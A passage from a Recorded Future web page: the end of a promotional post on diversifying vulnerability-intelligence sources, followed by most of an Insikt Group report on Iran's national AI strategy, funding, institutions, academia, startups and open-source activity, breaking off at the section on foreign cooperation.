        <p>Recorded Future automates risk alerting and tracking, including CVEs by severity. Beyond MITRE NVD's CVSS scores, we incorporate proprietary and open source scoring and data. This has enabled us to alert on vulnerabilities, <strong>an average of 11 days</strong>, before NVD even computes their risk scores, as exemplified in the screenshot from our platform.</p>
        <p><em>The screenshot from our platform below of a Recorded Future alert captured before NVD scoring - providing early warning signals of potential risk.</em></p>

        </p>
        <p>Evaluate Source Dependencies</p>
        <p>Review current intelligence sources to identify potential single points of failure in your security information supply chain.</p>
        <p>Implement Resilient Workflows</p>
        <p>Design vulnerability management processes that can adapt to changes in intelligence sources without operational disruption.</p>
        <p>Know How to Action the Data</p>
        <p>Having a robust and resilient information supply chain is important, but equally important is knowing what to action on and how to do it. <a href="/platform/demo-center">Actionable intelligence</a> is the only intelligence that matters. Organizations require additional detail on the exposures and tactics along with specific threat hunting packages. (See screen shot below of a TTP validated by our Insikt group research team along with the attached YAML threat hunt package to eradicate it.)</p>
        <p>

        </p>
        <h2>Conclusion: The Power of Intelligence Integration</h2>
        <p>The recent MITRE contract situation serves as a timely reminder that in cybersecurity intelligence, diversity and integration are strengths. It is very likely that additional community and open sources will emerge to expose and track this information, which will be great incremental sources. Organizations that leverage platforms capable of aggregating, normalizing, and contextualizing intelligence from multiple sources gain significant advantages in risk identification, prioritization, and mitigation. They are also more protected from disruptions related to any one particular source. This is supply chain management 101.</p>
        <p>Even better is when the platform can automate and proactively take action based on a wide variety of intelligence sourcing. As information supply chains continue to evolve, the most resilient security postures will belong to those organizations that embrace multi-source intelligence platforms—ensuring that when one source experiences disruption, the flow of critical security intelligence and automation continues uninterrupted.</p>
        <p>Recorded Future will continue help on this mission in every way we can. In addition to CVE information, we track over 4,000 threat actors, including 430 nation-state sponsored groups, and a variety of other sources of threats used in our analysis and recommendations. We actively monitor more than 90,000 command and control servers while scanning 30 million domains and URLs each day. We make some of this available for free in our public vulnerability database site, where you can see trending vulnerabilities and search for CVEs and software: <a href="/vulnerability-database">https://www.recordedfuture.com/vulnerability-database</a></p>

          <img loading="lazy" alt="insikt group logo" src="https://www.recordedfuture.com/media_17759d8b91bf0c9106a0fa82007bef7e3316158b4.png?width=750&amp;format=png&amp;optimize=medium" width="300" height="48" />
        </p>
        <h2>Executive Summary</h2>
        <p>Iran recognizes the vital role artificial intelligence (AI) will play in its future economic viability, regional influence, and national security and has begun to implement a top-down effort to achieve regional technological competitiveness. Since the Supreme Leader issued a directive in 2021, Iran has endeavored to develop a national strategy and oversight mechanism for AI and foster a technological ecosystem to drive domestic research and development. However, two key factors — Tehran’s global economic isolation, and its deeply entrenched system of government control and oversight — have almost certainly hindered Iran’s national AI development.</p>
        <p>In 2024, as Tehran’s support for its proxies Hamas and Hezbollah against Israel embroiled Iran in unprecedented regional conflicts and ongoing cyberwarfare, new insights emerged about how Iran has implemented AI technologies in its national security apparatus. Iran has used AI to bolster its capabilities in four main areas: cyberattacks, influence operations, military and intelligence systems, and domestic repression. These priorities will continue to propel Iran’s development and implementation of AI, almost certainly posing an increasing threat to Iran’s Western and regional adversaries. In cyberspace, AI will likely augment Iranian threat actors’ spearphishing and social engineering tradecraft, while AI’s implementation in Iran’s drone and missile arsenal is likely to pose the greatest physical threat from emerging technology.</p>
        <p>Iran’s approach to AI will likely mirror its broader strategic ambitions — to be a regional power and assert its national sovereignty — by building and implementing advanced technological capabilities. Iranian government initiatives are likely to be the driving force behind Iran’s AI development priorities, particularly given the absence of a flourishing AI private sector. While Tehran will promote its own technological prowess and indigenous AI development, the Iranian government is likely to leverage its relationship with China and Russia in various security realms to bolster its AI technology capabilities. Private industry, particularly companies in the AI or technology resources industry, should closely monitor end users of their models or materials to ensure Iranian threat actors are not using their products or acquiring controlled technologies. Similarly, governments should invest in identifying and preventing the Iranian defense industry from acquiring AI technologies that enhance its military capabilities.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>Iran has articulated lofty goals for its AI advancement and seeks to compete in the global AI race, but it is almost certainly hindered by two factors: First, its economic and commercial isolation limits its access to technological resources and human capital. Second, its top-down government control and oversight stifles private innovation in AI.</li>
          <li>To augment its own indigenous research and development (R&amp;D) capabilities in AI, Iran will likely leverage its bilateral and regional relationships for technology engagement with China, Russia, and other non-Western countries.</li>
          <li>Amidst unprecedented domestic upheaval and regional conflict over the last three years, Iran very likely views AI as a key force multiplier for its national security and defense and has sought to integrate AI into its cyber and influence operations, military systems, and domestic surveillance infrastructure.</li>
          <li>It is very likely that Iranian threat actors will increasingly use generative AI and large language models (LLMs) to enhance their influence and cyber operations, increasing risk to adversarial governments, as well as their critical infrastructure, technology companies, and other security-related industries.</li>
          <li>Iran has very likely endeavored to implement AI in its military defense systems and publicly touts the capability, though its operational uses of the technologies remain unproven.</li>
          <li>In the domestic sphere, Iran has very likely increased its efforts to deploy AI for morality enforcement and opposition monitoring, to enhance its control over Iranian society, particularly after the Woman Life Freedom protest movement.</li>
          <li>Companies and governments should maintain vigilance in cybersecurity practices to reduce vulnerabilities to AI-enabled cyber and influence operations and limit Iran’s access to AI resources and expertise that could increase Tehran’s threat to regional security.</li>
        </ul>
        <h2>Iran’s AI Ambitions</h2>
        <p>At the highest level of its leadership, Iran has recognized and sought to develop an overarching national focus on AI ( هوش مصنوعی in Persian). In November 2021, Supreme Leader Ali Khamenei called AI “an important and futuristic issue” that will “play a role in the future administration of the world,” and <a href="https://www.memri.org/reports/irans-supreme-leader-khamenei-we-must-master-all-layers-artificial-intelligence-technology">urged</a> Iran to become a top ten country in the field of AI. In August 2024, Khamenei urged Iran to “master” and “develop the deep and diverse layers of AI technology,” warning that a global oversight body (similar to the International Atomic Energy Agency [IAEA]) might regulate its use in the future. Khamenei’s stated ambition for Iran’s AI prominence initiated a flurry of government-led activity to develop and implement a national strategy and technological ecosystem to align with the Supreme Leader’s intent. Iran subsequently began creating a national AI roadmap that evaluated the “strategic documents” of 23 countries in the field of AI and developed a plan to realize Khamenei’s goal by 2032. The goals of the roadmap document were to achieve “80 percent of research to meet the needs of the country, use of 45 percent of AI in industries, $8 billion investment in AI, and a 12 percent share of AI in the GDP." The document contained fourteen “macro policies,” 47 “micro-policies,” 39 “general actions,” and 155 “projects and activities.” According to the roadmap, by the Persian year 1410 (starting March 2031), Iran would need to train 600,000 experts in the AI field to accomplish these objectives.</p>
        <p>Iran’s presidency — specifically, the Vice Presidency for Science, Technology and Knowledge-based Economy — oversees the Iranian government’s effort to establish and implement an AI strategy. On December 3, 2023, President Ebrahim Raisi issued an executive order to establish the “National Steering Committee and the National Artificial Intelligence (AI) Center,” which would “focus on creating integrated AI processing and data service providers, aligning with the country’s needs, and implementing large-scale AI projects." He appointed Reshad Hosseini as Secretary for the Development of Artificial Intelligence and Robotics Headquarters, a role intended to develop a “technology development roadmap” and to make “maximum use of all the internal capacity of the innovation ecosystem." Iran’s AI Strategic Council was to be formed of “ministers and heads of relevant institutions” to “implement, coordinate, and monitor” a National AI Document.</p>
        <p>After Raisi’s death in May 2024, the administration of President Masoud Pezeshkian has continued to emphasize Iran’s AI strategy. The National AI Organization (or the National Organization for AI) was inaugurated in July 2024 in Tehran. Insikt Group identified the organization’s physical location in north central Tehran, on Molla Sadra Street (Figures 1-3). During Pezeshkian’s endorsement ceremony and National Government Week meeting in August 2024, Khamenei advised the new administration that the ”good initiative” begun under deceased President Raisi “unfortunately remains unfinished,” but advised that the National AI Organization, under the direct supervision of the President, should continue Raisi’s progress. On October 15, 2024, Iran’s Information Technology Council issued a decision that “within two months, the National Organization of Artificial Intelligence should present to the working group the requirements for creating, developing, maintaining and publishing data and information in the hyper scale database of artificial intelligence."</p>
        <p>Pezeshkian appointed Hossein Afshin, a professor of mechanical engineering at Sharif University of Technology, as his Vice President for Science, Technology, and Knowledge-based Economy, who also serves as the secretary and vice president of the National AI Organization and serves as the face of AI development within Iran. Pezeshkian also assigned his First Vice President, Dr. Mohammad Reza Aref, as chairman of the National AI Organization and its strategic council. Aref’s appointment as First Vice President <a href="https://amwaj.media/en/media-monitor/critics-slam-return-of-lord-of-silence-as-iran-s-first-vice-president">prompted</a> criticism for his “political obscurity,” likely reflecting Pezeshkian’s choice for the position was based on his scientific prowess and technical acuity rather than his accomplishments as a reformist politician. The prominent role of Aref — who holds two advanced degrees in electrical engineering from Stanford University, has been a professor at two prestigious Iranian universities, and has <a href="https://ieeexplore.ieee.org/author/37300306900">published</a> scholarly articles on information technology — as Pezeshkian’s deputy with oversight of the country’s AI program suggests an increasing recognition of the importance of AI.</p>

        <h2>Laying the Foundations of an AI Ecosystem</h2>
        <p>Insikt Group examined Iranian government statements, press releases, leadership speeches, academic journals, industry websites, and news media, all of which provide key insights into the development and deployment of AI in Iran. However, these sources often provide broad knowledge about Iran’s ambitions or intentions regarding AI and lack details on the specific models, technology, or deployment of AI in support of national security objectives. Western AI companies, such as OpenAI, Google, and Microsoft, as well as global cybersecurity and military experts, offer additional perspectives and analysis of Iran’s AI use cases.</p>
        <h3>National AI Strategy Development and Challenges</h3>
        <p>Following its leader’s 2021 directive, the Islamic Republic has striven to develop and integrate AI through the establishment of various bureaucratic entities and industry initiatives. Iran’s progress in AI advancement is almost certainly limited by two factors: (1) its economic and commercial isolation and (2) its government control and oversight. After years of international sanctions and commercial isolation, Iran’s technological advancement, particularly in security-related industries such as defense, energy, and maritime shipping, depends on indigenous and domestically engineered capabilities. Iran <a href="https://www.atlanticcouncil.org/blogs/iransource/iran-s-troubled-quest-for-food-self-sufficiency/">strives</a> for self-sufficiency in various sectors, including food and energy, and this concept of a “resistance economy,” which <a href="https://www.washingtoninstitute.org/policy-analysis/khamenei-attempts-restore-optimism-and-normality-nowruz-speeches">underpins</a> Iranian strategic culture and economic development priorities, very likely shapes the development of Iran’s AI ecosystem. The Iranian government almost certainly <a href="https://www.cambridge.org/core/journals/iranian-studies/article/artificial-intelligence-in-iran-national-narratives-and-material-realities/9D2C33F3F1BC459712651443F1D203FB">disseminates</a> the narrative that Iran is a competitor in an AI global race and seeks to prove its technological prowess. As a result of Iran’s national ambitions for AI, its development ecosystem is very likely government-driven, in partnership with private industry and academia. Iranian technological leaders very likely understand that foreign advances in AI computing power, including private technology companies, can both benefit and augment Iran’s own internal efforts and uses. This dynamic — a top-down national strategy and AI technical development framework that is supported rather than driven by Iran’s own private sector innovation — is likely to limit the potential of Iran’s AI advances.</p>
        <p>Iran’s own private sector innovation is likely stifled by its economic isolation and its dependencies on government funding and direction. Iran claims that the government’s expanded support to the tech sector resulted in a surge of Iranian venture capital firms, accelerators, and “innovation centers” between 2019 and 2020, as these firms provided localized solutions amid global supply chain disruption (after the US withdrew from the Iran nuclear agreement and re-imposed sanctions). However, according to a 2022 United Nations <a href="https://www.undp.org/publications/mapping-existing-innovation-ecosystem-ir-iran">report</a> on Iran’s innovation landscape, sanctions significantly hampered Iran’s “startup ecosystem” and the domestic and foreign appetite for investments in Iranian technology startups after 2018 was “reduced substantially.” Iran’s challenges and limitations are reflected in several global indices that analyze and measure AI advances and technological innovation across countries. Stanford University’s Global AI Vibrancy Tool, which <a href="https://hai-production.s3.amazonaws.com/files/global_ai_vibrancy_tool_08.27.24.pdf">defines</a> AI vibrancy as “the level of activity, development, and impact of AI technologies within a country,” does not include Iran in its analysis of 36 countries leading AI-related metrics. Iran is ranked 64th in the Global Innovation Index, which <a href="/research/irans-ai-ambitions-balancing-economic-isolation-national-security-imperatives?host=https%3A%2F%2Fwww.recordedfuture.com">reflects</a> a notable improvement over the last ten years. However, Iran’s institutional, regulatory, and business environments ranked 127th, 131st, and 128th, respectively, underscoring the systemic challenges to Iran’s innovation ecosystem. Oxford Insights <a href="https://www.wipo.int/web-publications/global-innovation-index-2024/assets/67729/2000%20Global%20Innovation%20Index%202024_WEB3lite.pdf">ranked</a> Iran 91st of 193 countries in the 2024 “Government AI Readiness Index,” a three-position improvement from its 2023 ranking, but scored lowest in the “vision,” “adaptability,” and “maturity” dimensions.</p>
        <p>In 2022, Iran revealed fifteen policies shaping its AI development roadmap. A key theme underpinning these policies was the importance of national research centers, private industries, and universities working together to advance Iran’s AI development. Notably, two of the policies sought to support the private industry’s use of “academic plans” and to increase private industry’s trust in universities, likely suggesting a divide between Iran’s technical industry and its academic institutions. Another key theme of the policies was increasing foreign engagement and cooperation between Iranian and foreign academic centers. This likely reflects Iran’s interest in leveraging foreign partnerships, particularly with countries that are adversarial to the West, in the AI field.</p>
        <p>In July 2023, a study from the Journal of Science &amp; Technology Policy found that “the artificial intelligence ecosystem in [Iran] has not yet taken shape in the true sense” and “there is still no relative consensus among actors for dividing tasks and missions." Less than a year later, the same journal — which is affiliated with Iran’s National Science Policy Research Center — published a Nowruz 1403 (Persian new year, corresponding with March 2024) special edition entitled “Generative Artificial Intelligence: Multiple Perspectives on Opportunities, Challenges, and Implications in Research, Practice, and Policymaking” that examined the “abundant ethical and legal opportunities and challenges” of AI, specifically ChatGPT’s “practical, ethical, semantic, and policy challenges." The study’s conclusion highlighted the “lack of well-developed ethical guidelines” and noted that it is “vital that new rules be established to govern these instruments, and given their global nature, international coordination is also necessary to maximize their benefits.” The 43 “expert” authors from various business and technological fields disagreed about whether ChatGPT should be restricted or legalized in Iran.</p>
        <p>Iran’s bureaucratic challenges in the AI realm, including changes in presidential administrations and a plethora of organizational stakeholders with overlapping responsibilities, likely limit the country’s ability to implement an overarching strategy for its AI development. Tehran’s policy toward AI is overseen by Iran’s Supreme Council of the Cultural Revolution (SCCR) — a strategic policy body that answers only to the Supreme Leader — whose approval in June 2024 was required to move forward with the National AI Organization, steering council, and the document’s “generalities.” This approval involved review of the AI organization’s statutes and 18,000 supporting documents to ensure the project was not “tainted by Western influence.” The SCCR established a specialized Commission for AI in September 2022 composed of officials from all armed forces branches, the General Staff of the Armed Forces, the Office of the Supreme Leader, the Ministry of Intelligence, and the Ministry of Higher Education. In January 2025, Pezeshkian noted the importance of AI development in a meeting with the SCCR, asserting that “any delay or backwardness in the development of AI in Iran would be damaging and irreparable.” Domestic critics of Iran’s AI policy have raised concerns about the “unstable decisions, constant policy changes, and lack of a clear roadmap” that has hampered the country’s AI program. For example, in December 2024, Afshin announced that the cabinet was drafting a charter for the National AI Organization that would focus on the organization’s role in planning and overseeing AI activities; three months later, semi-official news agency Tasnim News suggested the possibility that the National AI Organization could be dissolved, raising a “series of contradictions” and “unanswered ambiguity.”</p>
        <h3>AI Budget</h3>
        <p>Documentation of Iran’s investment and funding of AI is opaque, but even with conflicting information, Iran’s lack of significant AI funding compared to its competitors will likely imperil its top-ten AI ambitions. The SCCR reportedly allocated a budget totaling 3.5 trillion Tomans (“over 83 million dollars”) in its approval; Iran’s initial operating budget for AI has also been reported as $50 million USD. According to the Tehran Times, 50 trillion rials (“some $100 million”) has been allocated for the development of AI operators during Persian year 1403 (between March 2024 and March 2025). In January 2025, Iran’s National Development Fund — independent of the Iranian government budget — agreed to allocate $15.6 million USD to AI projects in universities and private research centers, while another $100 million USD will be provided in the form of loans. These funding numbers lag significantly behind the AI budgets of regional competitors like the United Arab Emirates (approximately $1.2 billion USD) and Saudi Arabia (approximately $2 billion USD).</p>
        <h3>Government Entities</h3>
        <p>Insikt Group identified a number of government entities that are involved in the direction, strategic planning, and national coordination for the development of Iran’s AI capabilities. The protracted process for the formulation of Iran’s national AI strategy document, which has <a href="https://ideaagency.net/irans-advancements-in-ai-collaboration-on-national-strategy/">involved</a> a cross-agency collaboration process with multiple stakeholders, likely reflects a bureaucratic competition for influence and ownership of AI leadership within the Iranian government. The division of power among various government elements has likely hampered Iran’s ability to form a cohesive AI strategy and development plan.</p>

        <p><strong><em>Table 1:</em></strong> <em>Iranian entities involved in AI strategy (Source: Recorded Future)</em></p>
        <p>Iran’s military plays a key role in technological developments through civil-military cooperation, which very likely extends into the AI realm. Iranian armed forces, including the Islamic Revolutionary Guard Corps (IRGC), have <a href="https://cira.exovera.com/research-analysis/irgcs-involvement-in-science-technology-parks-blurs-line-between-civilian-military/">affiliated</a> universities and science and technology (S&amp;T) parks and run their own technology parks as “incubators.” For example, Imam Hossein University — affiliated with the IRGC — has a technology center and hosted “The International Conference on Artificial Intelligence and the Future Civilization” on January 29, 2025. Iran’s military branches from the Army and IRGC’s ground, naval, and air forces each have their own research and development entity, <a href="https://link.springer.com/chapter/10.1007/978-3-031-58649-1_19">referred</a> to as a Research Self-Sufficiency and Jihad Organization (RSSJO), that conducts specialized and tailored R&amp;D for the unique needs of their respective forces. These RSSJOs are likely involved in independent efforts in defense-related R&amp;D and in cooperation with academic institutions; they are likely integrating AI development into those efforts. Iran’s Ministry of Defense and Armed Forces Logistics (MODAFL) also likely has a key role in defense-related AI development, having signed partnership agreements with 80 universities and 800 industrial towns in Iran.</p>
        <h3>Government Initiatives</h3>
        <p>Announcements by the Vice Presidency for Science, Technology and Knowledge-based Economy regarding its AI development initiatives likely suggest Iran is working to develop a sovereign AI capability — meaning an Iranian national capability to <a href="https://aimagazine.com/articles/what-is-sovereign-ai-and-why-is-it-gaining-traction">produce</a> AI using its own infrastructure, data, workforce, and business networks through the development of foundation models trained on local datasets that reflect local language and culture. Hossein Afshin, Iran’s Vice President for Science, Technology and Knowledge-based Economy, hosted a meeting with the “Technology Group” from Tarbiat Modarres University on December 1, 2024, during which he reviewed the team’s progress, requirements, and support mechanisms for its “Project for Designing a Large Native Iranian Language Model.” He subsequently announced on December 3, 2024, that a prototype of Iran’s “national AI operating system,” which was “designed to host AI algorithms locally,” was expected in six months. Iran intends to launch the country’s first GPU data center by 2025 and plans to establish its first AI park — to “showcase the technological developments of the country and provide practical AI-related services to the people” — within the next two years.</p>
        <p>On March 15, 2025, Vice President Afshin unveiled Iran’s national AI platform and announced a phased rollout of the project, framing it as a strategic move in a global “war of chips and algorithms.” The platform’s initial testing and optimization are planned for the first half of 2025, followed by limited access for technology experts and companies in the third quarter, a public beta release in September 2025, culminating with a public release in approximately March 2026. Over 100 Iranian professors and researchers collaborated on the project, which was developed in cooperation with Sharif University of Technology — an institution that is <a href="https://www.opensanctions.org/entities/NK-nxBVUwhmE8JFVPkiVzKVaS/">sanctioned</a> for its links to the IRGC and MODAFL related to military and ballistic missile technology development. An expert developer and representative of Sharif University, Hossein Asadi, noted that the AI platform was developed using an open-source framework and specifically highlighted that it would be “entirely independent, with no reliance on foreign APIs [application programming interfaces],” ensuring the platform’s services would continue without disruption “even if the country’s internet were to be completely disconnected.”</p>
        <p>Iran almost certainly seeks to leverage domestic resources to support these development initiatives. On December 13, 2024, Afshin declared the government’s intention to jumpstart domestic chip production for AI through the “Sahand National Project” (“پروژه ملی سهند”). The Sahand National Project is consistent with Iran’s focus on leveraging its own human and natural resources to deliver indigenous technological solutions and is likely a reaction to an anticipated increase in economic isolation under the US presidential administration of Donald Trump. The US government <a href="https://bidenwhitehouse.archives.gov/briefing-room/statements-releases/2025/01/13/fact-sheet-ensuring-u-s-security-and-economic-strength-in-the-age-of-artificial-intelligence/">announced</a> export restrictions on January 13, 2025, which are designed to curtail the sale of chips with high-computational graphics processing unit (GPU) power for AI advanced development (such as Nvidia’s A100 and H100 chips) to sanctioned countries like Iran.</p>
        <p>According to Iranian media, the project’s aim is to manufacture “nine-nines” (99.9999999%) purity silicon wafers, the first step in setting up a domestic supply chain for microchips, with a view to open Iran’s first GPU data center by “early 2025.” While public information on the project remains limited, its reported location — in Sahand, East Azerbaijan province — would likely have been chosen for its proximity to <a href="https://www.crunchbase.com/organization/sahand-industrial-group">Sahand Industrial Group</a> (SIG), Iran’s leading glass and silica producer, and the Sahand University of Technology, which has specialized laboratories in material and nanomaterial engineering. Using satellite imagery, Insikt Group identified a new two-million-square-foot facility under construction near an existing SIG silica manufacturing plant in Sahand, showing significant investment in the region’s industrial capabilities.</p>

        <p>Another government initiative announced on January 11, 2025, by Afshin aims to establish a hub for AI innovation in the oil and gas industries on Kish Island, Southern Iran, in association with the Persian Gulf Petrochemical Industries Company and the Kish Free Zone Organization. The location choice likely enables the Iranian government to unlock three benefits for the acceleration of AI development: the Kish Free Zone’s lax foreign investment and fiscal policies to encourage foreign direct investments (FDI); existing infrastructure, including an international airport and ports that can be leveraged for international transit; and lax entry visa requirements on Kish Island that <a href="https://travel.state.gov/content/travel/en/international-travel/International-Travel-Country-Information-Pages/Iran.html">enable</a> reputable Iranian academic institutions (such as Sharif University of Technology, which has an international campus in Kish) to attract foreign talent and investment.</p>
        <p>Iran has announced several AI-enabled tools for the benefit of the Iranian government and society. Alongside his announcement of Iran’s domestic chip production project in December 2024, Afshin also declared that the Iranian government has prioritized the development of “AI assistants” available to government officials, developed “in collaboration with universities” with a team of over “70 expert professors.” The AI assistants are reportedly expected to help government ministers to “extract both laws and regulations and production-related issues from data” and “make suggestions in decision-making.” In August 2024, Iran’s National Cyberspace Center announced the Arbaeen Artificial Intelligence Assistant (which references Arbaeen, a Shi’ite holy day, during which Shi’a Muslims <a href="https://www.newarab.com/features/explainer-what-arbaeen">make</a> a pilgrimage to Iraq) was “a guide for pilgrims to access routes and processions, management of information for scheduling ceremonies and events, as well as the status of health and medical services, weather conditions, and even cultural and linguistic guidance online.” In November 2024, Iran’s national religious headquarters, located at Qom Seminary, launched an “indigenously developed platform that uses AI to answer questions and remove doubts on religious issues.” Dubbed Deendaan, the platform was introduced by the seminary’s National Center for Answering Religious Questions. Another entity in Qom, the Noor Computer Centre for Islamic Sciences Research, is seeking to <a href="https://archive.is/npvsM#selection-2349.43-2349.93">incorporate</a> AI in its use of religious texts and data to “accelerate the Islamic studies of senior clergy and speed up their communication to the public.”</p>
        <h3>Academia</h3>
        <p>Iran’s most globally recognized AI innovation, the Surena IV humanoid robot, was developed by Iran’s academic sector, underscoring the key role of universities and research institutes in Iran’s AI ecosystem. Created at the Center of Advanced Systems and Technologies (CAST) at the University of Tehran, the robot’s fourth generation uses the “Robot Operating System” for “state monitoring, real time implementation of algorithms, and simultaneous running of several programs.” The robot was <a href="https://www.asme.org/topics-resources/content/10-humanoid-robots-of-2020">listed</a> as one of the top ten humanoid robots in 2020, according to the American Society of Mechanical Engineers. In addition to developing the Surena humanoid, CAST has a “portfolio” of projects related to various fields, including “mechatronics, robotics, and intelligent systems inspired by nature,” as well as “aquatic inspired” robots and those “inspired by birds.”</p>

        <p>Leading Iranian universities in the field of AI <a href="https://edurank.org/cs/ai/ir/">include</a> the University of Tehran, Amirkabir University of Technology, and Iran University of Science and Technology, all located in Tehran. According to the state-run news outlet Tehran Times, over the last ten years, the most “scientific productions” in artificial intelligence have been associated with Tehran University, Tabriz University, and Amirkabir University of Technology. However, these universities likely remain low on global rankings for AI research; the University of Tehran, widely recognized as the best higher education institution in Iran, <a href="https://edurank.org/uni/university-of-tehran/rankings/">ranks</a> at number 201 globally for AI. Edurank data suggests that Iran’s top three universities are ahead or on par with their Russian peers (Moscow State University, St. Petersburg State University, and the National Research University) but far behind China (Tsinghua University, Harbin Institute of Technology, and Shanghai Jiao Tong University) in terms of production (number of publications) and influence (number of citations). Iranian national investment in AI research is likely less than Russian investment, but its academic citation numbers are greater than Russia’s, likely reflecting that Iran’s AI academics maintain disproportionate influence in their field relative to their Russian counterparts.</p>

        <p>In the absence of a vibrant private AI sector, the Iranian government is likely reliant on academics specialized in AI for government projects at the expense of cutting-edge research. Iranian media boasted that “70 expert professors” were working to design an AI platform for government ministers. Sharif University of Technology, ranked fourth in Iran in AI, is likely a key partner for government projects, such as Iran’s national AI platform. The government demand for expertise likely represents a misallocation of research talent towards state-mandated engineering projects, which likely impedes Iran’s research potential. However, Iranian academic centers may also be exploring open-source AI development, which likely encourages innovation. For example, in November 2024, Amirkabir University, in collaboration with AI developer Part AI, announced the development of the “most comprehensive and powerful evaluation system for Persian language models,” known as <a href="https://huggingface.co/spaces/PartAI/open-persian-llm-leaderboard">Open Persian LLM Leaderboard</a>, which includes over 40,000 samples and tracks the performance of 25 major open-source models at Persian-language tasks. Part AI has also published six open-source models, including Persian finetunes of Meta’s Llama 3.1 and Google’s BERT models.</p>
        <p>A search of recent and upcoming conferences related to AI suggests Iran’s academic sector is exploring AI applications in several sectors, including medical sciences, telecommunications, electrical engineering, education, mining, and industry. In 2024, Iran held a number of inaugural national conferences on specific topics, very likely suggesting the concept of how AI can benefit specific industrial sectors is still nascent in Iran. For example, in October 2024, Iran held the first national conference on AI in education and learning; in May 2024, Iran held its first national conference on AI and the Internet of Things; in April 2024, it held its second national conference on Digital Transformation and Intelligent Systems.</p>

        <p>Iranian universities are very likely driving international engagement by hosting conferences on AI. A review of international AI-related conferences held in Iran in 2024 and planned for 2025 highlights a wide range of foreign academic participants, including academics from Austria, Australia, Canada, China, France, Italy, Iraq, Malaysia, Russia, Spain, Vietnam, and the United Kingdom. Iranian academic output on AI likely benefits from strong ties with Iranian-American researchers and collaboration with US academic institutions. An Iranian study of domestic output of AI research between 1978 and 2022 found that US researchers were the most frequent international co-authors on Iranian AI research. However, Iranian academic AI research likely remains of limited international influence. 19.9% of Iranian AI papers during this period received no citations, with the majority receiving between one and five citations.</p>

        <h3>Private Technology Companies</h3>
        <p>Iran’s private sector currently faces significant challenges in the face of international sanctions and lack of global competitiveness, including the inability to retain top talent, the absence of foundational AI model companies, low capital expenditures on AI by existing major players in the technology sphere, and a nascent venture capital (VC) ecosystem.</p>
        <p>Iran almost certainly <a href="https://www.mei.edu/publications/escalating-emigration-and-drought-irans-it-industry">suffers</a> from a significant talent outflow of skilled workers in technology and AI. According to a 2021 report by the Iran Migration Observatory, 50% of Iranians <a href="https://www.mei.edu/publications/escalating-emigration-and-drought-irans-it-industry">involved</a> in startup communities and 44% of graduates were planning on emigrating, citing unpredictable internet regulations, censorship, and lack of wage competitiveness as direct factors. In December 2024, Iran’s Vice President Afshin announced a new regulation offering monthly grants of approximately 15 million Tomans ($3,564 USD) for PhD students to encourage research and scientific activities, stressing the importance of preventing talent migration.</p>
        <p>Despite talent shortages, Indian data provider TraxCN has <a href="https://tracxn.com/d/artificial-intelligence/ai-startups-in-iran/__aWyQstgrq_MtBd_T7d2d9-itkASMubg8G_HbLca8W_8/companies">identified</a> at least 85 companies in Iran advertised as operating in the field of AI, with a majority focusing on developing AI enterprise applications and tools for healthcare, agriculture, and finance. Several companies provide chatbot services and LLMs, including Persian-language chatbots; however, it remains unclear whether they are developing proprietary models rather than deploying existing open-source models. Additionally, TraxCN considers that seventeen (20%) of these companies are currently “deadpooled” (no longer in business) and 60 (80.5%) remain unfunded, indicating that despite government efforts to incentivize AI startups, the average Iranian AI startup is doomed to fail in raising funds or operating sustainably. Iranian AI website Hooshio published a list of 29 Iranian AI companies, highlighting the Parth AI Research Center as “one of the top five companies in the Middle East” with more than 150 specialists in AI. The company claims to have Iran’s “biggest AI research center” with a department for machine vision, natural language processing (NLP), speech processing, and data analysis, as well as an AI college.</p>
        <p>Iran’s private tech sector is likely trying to financially motivate AI innovation and engage with Iran’s developer community. Digikala, Iran’s <a href="https://www.crunchbase.com/search/organizations/field/organizations/location_identifiers/iran">biggest</a> technology and e-commerce company (valued at approximately $500 million USD as of August 2024), <a href="https://archive.ph/c9swn">hosted</a> an AI hackathon in March 2024 with a first-place prize of 60 million Tomans (approximately $14,258 USD). Notably, the hackathon’s rules <a href="https://archive.ph/c9swn">banned</a> participants from using Western AI models (listing models from Western companies like OpenAI, Anthropic, and Cohere), likely intending for participants to focus on using open-source models for hackathon entries.</p>
        <p>Unlike their Western and Chinese counterparts, Iranian VC funds are likely limited in their ability to fund and support a domestic AI startup ecosystem to fulfill national security and economic priorities, with startups <a href="https://www.statista.com/outlook/fmo/capital-raising/traditional-capital-raising/venture-capital/iran">forecasted</a> to raise $28.13 million USD in capital in 2025 across all sectors. Iran’s Pardis Technology Park (PTP), dubbed “Iran Silicon Valley” and operating “under the auspices of” the Vice Presidency for Science, Technology, and Knowledge-based Economy, is “the most significant center for developing startups and knowledge-based companies and commercialization of technology and innovations in Iran.” PTP, which is part of the Iran International Innovation District, boasts 25.5 million EUR of foreign investments in its companies over the last five years and is also supported by the Iran National Innovation Fund, Iran’s version of a venture capital and private equity firm.</p>

        <h3>Open Source</h3>
        <p>Open-source communities <a href="https://www.gov.uk/government/publications/ai-opportunities-action-plan-government-response/ai-opportunities-action-plan-government-response">play</a> an important role in the development of AI capabilities, as open-source AI models can <a href="https://web.archive.org/web/20190226132342id_/http://pdfs.semanticscholar.org/71bc/34f9611e020e5d673b03af354d45b022018d.pdf">lower</a> research and development costs, present opportunities for technology transfers, and reduce dependency on models developed by foreign companies. Iran’s open-source community almost certainly lags behind in terms of developing home-grown AI models, finetunes, and datasets. Data from open-source AI model platform HuggingFace shows that Farsi-language models (including multilingual models from US AI companies) are outnumbered by open-source models with language capabilities for Mandarin, Korean, or Russian. Sanctions are almost certainly <a href="https://arxiv.org/html/2404.05489v1">throttling</a> the emergence of a strong Iranian open-source software community. GitHub, a major platform for hosting open-source code, was <a href="https://github.blog/news-insights/policy-news-and-insights/advancing-developer-freedom-github-is-fully-available-in-iran/">blocked</a> in Iran in 2019 and only resumed operations in 2021 after securing a special license from the US Department of the Treasury’s Office of Foreign Assets Control (OFAC) board.</p>

        </div>
        <p>Iran’s biggest open-source AI contributor, measured by the number of Farsi-language AI models published on Hugging Face, is likely <a href="https://huggingface.co/hezarai">Hezar AI</a>, followed by <a href="https://huggingface.co/persiannlp">Persian NLP</a> and <a href="https://huggingface.co/HooshvareLab">Hooshvare Research Lab</a>. US technology companies <a href="https://huggingface.co/facebook">Facebook</a> and <a href="https://huggingface.co/google">Google</a> are also among the top ten publishers of Farsi-language models on HuggingFace.</p>
        <h3>Foreign Cooperation</h3>
